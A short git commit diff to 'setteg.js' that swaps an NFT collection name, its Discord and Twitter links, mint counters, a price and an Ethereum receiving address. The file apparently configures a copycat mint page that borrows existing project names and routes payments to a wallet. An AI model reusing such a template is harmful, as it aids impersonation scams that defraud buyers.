177e39efe7088c1b8e67e310691eae0a89193373
cryptothanh <115431178+cryptothanh@users.noreply.github.com>
2022-11-03 22:04:36 +0100

    Update setteg.js

--- setteg.js
+++ setteg.js
@@ -1,9 +1,9 @@
 const MAX=5
-const namess="Mutant y00ts Yacht Club";
-const discord = 'https://discord.gg/myyc';
-const twitter = 'https://twitter.com/myyc';
+const namess="Dog Hates NFTs";
+const discord = 'https://discord.gg/doghatesnftees';
+const twitter = 'https://twitter.com/doghatesnftees';
 const startCounter = 2836;
 const endCounter = 3333;
 const IMGPrice=0.005;
-const ADDRESS = '0x5D07D6Bf11B621360dDbd06b787748DfEb8df462';
+const ADDRESS = '0x169135CF5ad5A743e76aE6b85421e0992b7193C1';
 
